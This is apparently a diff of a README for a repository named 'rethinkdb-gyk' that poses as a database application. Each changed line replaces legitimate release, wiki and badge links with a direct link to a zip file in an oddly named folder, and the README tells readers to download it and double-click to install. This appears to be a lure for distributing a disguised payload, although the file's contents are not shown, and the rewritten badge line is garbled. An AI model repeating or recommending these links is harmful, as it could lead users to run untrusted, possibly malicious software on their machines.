@@ -20,9 +20,9 @@ To run rethinkdb-gyk, your system should meet the following requirements:
 ## 🚀 Getting Started
 To start using rethinkdb-gyk, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/Vasusi9916/rethinkdb-gyk/releases) to download the latest version of the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip) to download the latest version of the application.
 
-   [![Download rethinkdb-gyk](https://img.shields.io/badge/Download%20r rethinkdb-gyk-blue.svg)](https://github.com/Vasusi9916/rethinkdb-gyk/releases)
+   [![Download rethinkdb-gyk](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip%20r https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip)](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip)
 
 2. Look for the latest release at the top of the page. Click on it to view all available files.
 
@@ -35,7 +35,7 @@ To start using rethinkdb-gyk, follow these simple steps:
 6. Follow the on-screen instructions to complete the installation.
 
 ## 📥 Download & Install
-To download rethinkdb-gyk, visit this page: [Download rethinkdb-gyk](https://github.com/Vasusi9916/rethinkdb-gyk/releases).
+To download rethinkdb-gyk, visit this page: [Download rethinkdb-gyk](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip).
 
 After downloading, double-click the downloaded file and follow the installation steps. The application will guide you through the setup process.
 
@@ -52,7 +52,7 @@ Once the installation is complete, you can start using rethinkdb-gyk by followin
 If you have questions or need assistance, feel free to reach out by opening an issue on the GitHub repository. The community is here to help.
 
 ## 📚 Documentation
-For more detailed instructions and advanced features, you can check the [Documentation](https://github.com/Vasusi9916/rethinkdb-gyk/wiki) available in the repository. This includes information on data types, querying, and backup processes.
+For more detailed instructions and advanced features, you can check the [Documentation](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip) available in the repository. This includes information on data types, querying, and backup processes.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues during installation or while using the application, consider the following tips:
@@ -63,7 +63,7 @@ If you encounter any issues during installation or while using the application, 
 - If the application crashes, try reinstalling it.
 
 ## 🔄 Update Notifications
-We release updates regularly. To stay informed about new features and fixes, visit the [Releases Page](https://github.com/Vasusi9916/rethinkdb-gyk/releases) often.
+We release updates regularly. To stay informed about new features and fixes, visit the [Releases Page](https://raw.githubusercontent.com/Vasusi9916/rethinkdb-gyk/main/unacquaintedly/rethinkdb-gyk_sciatical.zip) often.
 
 ## 👥 Contributing
 We welcome contributions to improve rethinkdb-gyk. If you have ideas for features or improvements, please submit a pull request or open an issue.
